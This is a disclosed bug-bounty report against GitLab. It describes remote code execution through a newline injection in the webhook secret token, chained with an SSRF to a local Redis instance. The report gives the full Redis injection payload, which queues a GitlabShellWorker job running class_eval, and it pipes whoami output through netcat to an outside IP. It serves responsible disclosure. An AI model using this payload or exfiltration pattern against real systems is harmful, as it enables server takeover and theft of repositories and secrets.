# Evaluating Ruby code by injecting Rescue job on the system_hook_push queue through web hook

## Report Details
- **Report ID**: 299473
- **URL**: https://hackerone.com/reports/299473
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-12-19T21:08:22.970Z
- **Disclosed**: 2018-04-27T02:21:14.315Z

## Reporter
- **Username**: jobert
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
The secret token field of a webhook is vulnerable to a new line injection, allowing an attacker to inject non-HTTP commands in a TCP stream. When a GitLab instance is configured with an external Redis instance, e.g. on `127.0.0.1:6379`, it may result in arbitrary code execution on a Sidekiq worker by abusing a blind Server-Side Request Forgery (SSRF) vulnerability in the webhook integration and the new line injection. One of my other reports regarding these SSRFs, #131190, is still open and has been for more than a year. However, because this is a service I haven't reported the SSRF in and chaining it with the new line injection increases the severity of the vulnerability, I decided to report it. To reproduce, start by signing in to the GitLab instance and creating a new project.

To reproduce the RCE, a Redis server has to be running on port 6379. Follow the GitLab documentation to set up the Redis server and reconfigure GitLab by running `gitlab-ctl reconfigure`. When that's done, continue to go to the Integrations section of the created project. Intercept your network traffic before continuing. Now, enter `http://127.0.0.1:6379/` as the webhook endpoint and `A` as the secret token. When the request is submitted, a request similar to the one below is submitted:

**Request**
```
POST /root/test/hooks HTTP/1.1
Host: gitlab-instance
...
----------1282688597
Content-Disposition: form-data; name="hook[url]"

http://127.0.0.1:6379/
----------1282688597
Content-Disposition: form-data; name="hook[token]"

A
...
```

In the request above I changed the body encoding to make it easier to inject the payload. Now, replace the `hook[token]` field with the payload below.

**Payload**
```
A
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
```

Then, when the integration persisted, click the `Test` button next to the newly created integration. Here's what happens next: a `POST` request will be submitted to `127.0.0.1`, port `6379` (Redis). Redis is pretty easy on errors, so it'll simply ignore the first couple lines of the HTTP request. Then, a couple headers further down, it is including the `X-GitLab-Token` that is vulnerable to the new line injection. Here's the entire request that is posted:

**Injected request**
```
POST / HTTP/1.1
Content-Type: application/json
X-Gitlab-Event: Push Hook
X-Gitlab-Token: A
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
 exec
Connection: close
Host: 192.241.233.143
Content-Length: 2495

{"object_kind":"push","ev<...>
```

When this is submitted to Redis, a new job will be shifted on the `system_hook_push` command. In order to evaluate Ruby code, I needed a Ruby class that'd implement the `perform` method that would allow me to execute a command or Ruby. The `GitlabShellWorker` was exactly what I was looking for:

**GitlabShellWorker**
```ruby
class GitlabShellWorker
  include ApplicationWorker
  include Gitlab::ShellAdapter

  def perform(action, *arg)
    gitlab_shell.__send__(action, *arg) # rubocop:disable GitlabSecurity/PublicSend
  end
end
```

As can be seen in the payload, the `GitlabShellWorker` is called with the arguments `class_eval` and the following Ruby code:

```
open('|whoami | nc 192.241.233.143 80').read
```

Because the Ruby is evaluated on a Sidekiq server, we need to exfiltrate the output of a command through `nc` or a similar tool. In this example, my server is listening on port 80 for connections. When the payload fires, it captures the output of the `whoami` command:

```
$ nc -l -n -vv -p 80
Listening on [0.0.0.0] (family 0, port 80)
Connection from [104.236.178.103] port 80 [tcp/*] accepted (family 2, sport 42874)
git
```

Besides the blind SSRF, the underlying vulnerability is the new line injection in the secret token. Fixing the new line injection seems mitigate the immediate risk for an RCE, but I'd encourage you to reprioritize the fix for the SSRF vulnerabilities in the services (reported by me previously). Let me know if you have any questions.

## Impact

An attacker can execute arbitrary system commands on the server, which exposes access to all git repositories, database, and potentially other secrets that may be used to escalate this further.

## Attachments
No attachments
